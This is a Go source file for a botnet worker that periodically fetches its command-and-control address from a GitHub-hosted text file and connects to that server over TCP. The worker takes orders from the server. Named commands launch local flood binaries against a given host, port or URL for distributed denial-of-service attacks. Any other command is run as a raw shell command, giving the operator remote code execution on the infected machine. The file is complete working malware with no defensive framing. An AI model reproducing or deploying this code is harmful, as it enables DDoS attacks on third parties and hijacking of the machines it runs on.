// --- worker.go ---
package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	CONFIG_URL      = "https://raw.githubusercontent.com/tenkhongvps1-ctrl/autocallport/refs/heads/main/port.txt"
	CONFIG_INTERVAL = 30 * time.Second
	HTTP_TIMEOUT    = 10 * time.Second
	RECONNECT_DELAY = 5 * time.Second
	READ_TIMEOUT    = 15 * time.Second
)

var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)

// ==================== TYPES ====================

type ProcessEntry struct {
	cmd    *exec.Cmd
	method string
	ip     string
	port   int
}

type CSKBot struct {
	configMu    sync.RWMutex
	currentHost string
	currentPort int

	connMu         sync.Mutex
	client         net.Conn
	isConnected    bool
	isReconnecting bool

	cancelRead context.CancelFunc

	processMutex    sync.Mutex
	activeProcesses map[int]*ProcessEntry

	reconnectMu    sync.Mutex
	reconnectTimer *time.Timer

	stopConfigChan chan struct{}
}

func NewCSKBot() *CSKBot {
	return &CSKBot{
		activeProcesses: make(map[int]*ProcessEntry),
		stopConfigChan:  make(chan struct{}),
	}
}

// ==================== CONFIG FETCHER ====================

func (bot *CSKBot) startConfigFetcher() {
	go func() {
		bot.fetchAndUpdateConfig()
		ticker := time.NewTicker(CONFIG_INTERVAL)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				bot.fetchAndUpdateConfig()
			case <-bot.stopConfigChan:
				log.Println("[Config] Fetcher stopped.")
				return
			}
		}
	}()
}

func (bot *CSKBot) fetchAndUpdateConfig() {
	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	url := fmt.Sprintf("%s?_t=%d", CONFIG_URL, time.Now().UnixNano())
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		log.Printf("[Config] Failed to create request: %v", err)
		return
	}
	req.Header.Set("User-Agent", "CSK-Worker/1.0")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("[Config] Fetch error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[Config] Unexpected status: %d", resp.StatusCode)
		return
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		log.Printf("[Config] Read error: %v", err)
		return
	}

	newHost, newPort, ok := parseConfig(strings.TrimSpace(string(body)))
	if !ok {
		log.Printf("[Config] Invalid format")
		return
	}

	bot.configMu.RLock()
	oldHost, oldPort := bot.currentHost, bot.currentPort
	bot.configMu.RUnlock()

	if oldHost == newHost && oldPort == newPort {
		return
	}

	log.Printf("[Config] Update: %s:%d -> %s:%d", oldHost, oldPort, newHost, newPort)
	bot.configMu.Lock()
	bot.currentHost = newHost
	bot.currentPort = newPort
	bot.configMu.Unlock()

	bot.forceReconnect()
}

func parseConfig(content string) (string, int, bool) {
	if m := configRegex.FindStringSubmatch(content); len(m) == 3 {
		p, err := strconv.Atoi(m[2])
		if err == nil && p > 0 && p <= 65535 {
			return m[1], p, true
		}
	}
	var host string
	var port int
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "cnc:") {
			host = strings.TrimSpace(strings.TrimPrefix(line, "cnc:"))
		} else if strings.HasPrefix(line, "port:") {
			p, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "port:")))
			if err == nil {
				port = p
			}
		}
	}
	if host != "" && port > 0 && port <= 65535 {
		return host, port, true
	}
	return "", 0, false
}

func (bot *CSKBot) getConfig() (string, int) {
	bot.configMu.RLock()
	defer bot.configMu.RUnlock()
	return bot.currentHost, bot.currentPort
}

// ==================== CONNECT ====================

func (bot *CSKBot) forceReconnect() {
	bot.connMu.Lock()

	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	if bot.cancelRead != nil {
		bot.cancelRead()
		bot.cancelRead = nil
	}

	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}

	bot.isConnected = false
	bot.isReconnecting = false
	bot.connMu.Unlock()

	bot.connect()
}

func (bot *CSKBot) connect() {
	bot.connMu.Lock()
	if bot.isConnected || bot.isReconnecting {
		bot.connMu.Unlock()
		return
	}
	bot.connMu.Unlock()

	host, port := bot.getConfig()
	if host == "" || port == 0 {
		log.Println("[Connect] No config yet, waiting...")
		bot.scheduleReconnect()
		return
	}

	bot.connMu.Lock()
	bot.isReconnecting = true
	bot.connMu.Unlock()

	addr := fmt.Sprintf("%s:%d", host, port)
	log.Printf("[Connect] Connecting to %s...", addr)

	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		log.Printf("[Connect] Failed: %v", err)
		bot.connMu.Lock()
		bot.isReconnecting = false
		bot.connMu.Unlock()
		bot.scheduleReconnect()
		return
	}

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
	}

	ctx, cancel := context.WithCancel(context.Background())

	bot.connMu.Lock()
	bot.client = conn
	bot.isConnected = true
	bot.isReconnecting = false
	bot.cancelRead = cancel

	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	bot.connMu.Unlock()

	log.Printf("[Connect] Connected to %s", addr)
	go bot.readCommands(conn, ctx)
}

// ==================== READ & DISPATCH ====================

func (bot *CSKBot) readCommands(conn net.Conn, ctx context.Context) {
	reader := bufio.NewReader(conn)
	for {
		select {
		case <-ctx.Done():
			log.Println("[Reader] Context cancelled, exiting.")
			return
		default:
		}

		conn.SetReadDeadline(time.Now().Add(READ_TIMEOUT))
		data, err := reader.ReadString('\n')
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			log.Printf("[Reader] Connection error: %v", err)
			bot.handleDisconnect()
			return
		}

		for _, command := range strings.Split(strings.TrimSpace(data), "\n") {
			command = strings.TrimSpace(command)
			if command != "" {
				bot.executeCommand(command)
			}
		}
	}
}

// ==================== COMMAND EXECUTION ====================

// executeCommand parse format mà main.go gửi:
//
//	csk-tsunami <url> <dur> 0 16 --random-path --rotate 2
//	csk-kraken  <host> <port> <dur> 1000 gb 1400
//	csk-pulse   <host> <port> <dur> 1000 pk 0
//	csk-deluge  <host> <dur> 22 333
//	stop <method> <ip>
//	stop <method> <ip> <port>
func (bot *CSKBot) executeCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	verb := strings.ToLower(parts[0])

	if verb == "stop" {
		bot.handleStopCommand(parts)
		return
	}

	switch verb {
	case "csk-tsunami":
		// csk-tsunami <url> <dur> 0 16 --random-path --rotate 2
		if len(parts) < 3 {
			log.Printf("[CMD] csk-tsunami: malformed command: %q", command)
			return
		}
		ip := parts[1]
		bot.launchScript("./lizhds", true, verb, ip, 0, parts[1:]...)

	case "csk-kraken":
		// csk-kraken <host> <port> <dur> 1000 gb 1400
		if len(parts) < 4 {
			log.Printf("[CMD] csk-kraken: malformed command: %q", command)
			return
		}
		ip := parts[1]
		port := atoiSafe(parts[2])
		bot.launchScript("./csk-kraken", true, verb, ip, port, parts[1:]...)

	case "csk-pulse":
		// csk-pulse <host> <port> <dur> 1000 pk 0
		if len(parts) < 4 {
			log.Printf("[CMD] csk-pulse: malformed command: %q", command)
			return
		}
		ip := parts[1]
		port := atoiSafe(parts[2])
		bot.launchScript("./csk-pulse", true, verb, ip, port, parts[1:]...)

	case "csk-deluge":
		// csk-deluge <host> <dur> 22 333
		if len(parts) < 3 {
			log.Printf("[CMD] csk-deluge: malformed command: %q", command)
			return
		}
		ip := parts[1]
		bot.launchScript("./lid2hz", true, verb, ip, 0, parts[1:]...)

	default:
		// Raw shell command từ moderator (!cmd) — chạy qua sh -c
		bot.launchShell(command)
	}
}

func atoiSafe(s string) int {
	v, _ := strconv.Atoi(s)
	return v
}

func (bot *CSKBot) launchScript(binary string, isExecutable bool, method, ip string, port int, args ...string) {
	if _, err := os.Stat(binary); os.IsNotExist(err) {
		log.Printf("[Launch] Binary not found: %s", binary)
		return
	}

	bot.chmodAllInCwd()

	var cmd *exec.Cmd
	if isExecutable {
		cmd = exec.Command(binary, args...)
	} else {
		cmdArgs := append([]string{binary}, args...)
		cmd = exec.Command("node", cmdArgs...)
	}
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("[Launch] Failed to start %s: %v", binary, err)
		return
	}

	pid := cmd.Process.Pid
	entry := &ProcessEntry{cmd: cmd, method: method, ip: ip, port: port}

	bot.processMutex.Lock()
	bot.activeProcesses[pid] = entry
	bot.processMutex.Unlock()

	log.Printf("[Launch] PID %d | %s | %s | port=%d", pid, method, ip, port)

	go func() {
		err := cmd.Wait()
		bot.processMutex.Lock()
		delete(bot.activeProcesses, pid)
		bot.processMutex.Unlock()
		if err != nil {
			log.Printf("[PID %d] exited with error: %v", pid, err)
		} else {
			log.Printf("[PID %d] exited cleanly.", pid)
		}
	}()
}

func (bot *CSKBot) launchShell(command string) {
	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("[Shell] Failed to start %q: %v", command, err)
		return
	}

	pid := cmd.Process.Pid
	entry := &ProcessEntry{cmd: cmd, method: "shell", ip: "localhost", port: 0}

	bot.processMutex.Lock()
	bot.activeProcesses[pid] = entry
	bot.processMutex.Unlock()

	log.Printf("[Shell] PID %d | %s", pid, command)

	go func() {
		err := cmd.Wait()
		bot.processMutex.Lock()
		delete(bot.activeProcesses, pid)
		bot.processMutex.Unlock()
		if err != nil {
			log.Printf("[Shell PID %d] exited with error: %v", pid, err)
		} else {
			log.Printf("[Shell PID %d] exited cleanly.", pid)
		}
	}()
}

// ==================== STOP COMMAND ====================

// handleStopCommand parse format main gửi:
//
//	stop <method> <ip>           → dừng process khớp method + ip
//	stop <method> <ip> <port>   → dừng process khớp method + ip + port
func (bot *CSKBot) handleStopCommand(parts []string) {
	if len(parts) < 3 {
		log.Println("[Stop] No target specified, stopping all processes.")
		bot.stopAllProcesses()
		return
	}

	method := strings.ToLower(parts[1])
	ip := parts[2]
	filterPort := -1
	if len(parts) >= 4 {
		filterPort = atoiSafe(parts[3])
	}

	bot.processMutex.Lock()
	defer bot.processMutex.Unlock()

	killed := 0
	for pid, entry := range bot.activeProcesses {
		if entry.method != method || entry.ip != ip {
			continue
		}
		if filterPort >= 0 && entry.port != filterPort {
			continue
		}
		if entry.cmd.Process != nil {
			if err := entry.cmd.Process.Kill(); err != nil {
				log.Printf("[Stop] Kill PID %d error: %v", pid, err)
			} else {
				log.Printf("[Stop] Killed PID %d | %s | %s | port=%d", pid, method, ip, entry.port)
				killed++
			}
		}
		delete(bot.activeProcesses, pid)
	}

	if killed == 0 {
		log.Printf("[Stop] No matching process for method=%s ip=%s port=%d", method, ip, filterPort)
	} else {
		log.Printf("[Stop] Killed %d process(es).", killed)
	}
}

func (bot *CSKBot) stopAllProcesses() {
	bot.processMutex.Lock()
	defer bot.processMutex.Unlock()
	for pid, entry := range bot.activeProcesses {
		if entry.cmd.Process != nil {
			if err := entry.cmd.Process.Kill(); err != nil {
				log.Printf("[StopAll] Kill PID %d error: %v", pid, err)
			} else {
				log.Printf("[StopAll] Killed PID %d", pid)
			}
		}
		delete(bot.activeProcesses, pid)
	}
}

func (bot *CSKBot) chmodAllInCwd() {
	entries, err := os.ReadDir(".")
	if err != nil {
		log.Printf("[Chmod] ReadDir error: %v", err)
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		if err := os.Chmod(e.Name(), 0755); err != nil {
			log.Printf("[Chmod] %s: %v", e.Name(), err)
		}
	}
}

// ==================== DISCONNECT & RECONNECT ====================

func (bot *CSKBot) handleDisconnect() {
	bot.connMu.Lock()
	bot.isConnected = false
	bot.isReconnecting = false
	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}
	bot.connMu.Unlock()

	log.Println("[Disconnect] Connection lost, scheduling reconnect.")
	bot.scheduleReconnect()
}

func (bot *CSKBot) scheduleReconnect() {
	bot.reconnectMu.Lock()
	defer bot.reconnectMu.Unlock()

	if bot.reconnectTimer != nil {
		return
	}

	log.Printf("[Reconnect] Retrying in %v...", RECONNECT_DELAY)
	bot.reconnectTimer = time.AfterFunc(RECONNECT_DELAY, func() {
		bot.reconnectMu.Lock()
		bot.reconnectTimer = nil
		bot.reconnectMu.Unlock()
		bot.connect()
	})
}

// ==================== CLEANUP ====================

func (bot *CSKBot) cleanup() {
	log.Println("[Cleanup] Shutting down...")

	select {
	case <-bot.stopConfigChan:
	default:
		close(bot.stopConfigChan)
	}

	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	bot.connMu.Lock()
	if bot.cancelRead != nil {
		bot.cancelRead()
		bot.cancelRead = nil
	}
	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}
	bot.connMu.Unlock()

	bot.stopAllProcesses()
	log.Println("[Cleanup] Done.")
}

// ==================== MAIN ====================

func main() {
	log.Println("[CSK Worker] Starting...")

	bot := NewCSKBot()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		bot.cleanup()
		os.Exit(0)
	}()

	bot.startConfigFetcher()

	for i := 0; i < 50; i++ {
		host, port := bot.getConfig()
		if host != "" && port != 0 {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	host, port := bot.getConfig()
	if host == "" || port == 0 {
		log.Println("[Main] No config after wait, will retry via reconnect.")
	} else {
		log.Printf("[Main] Config ready: %s:%d", host, port)
	}

	bot.connect()
	select {}
}
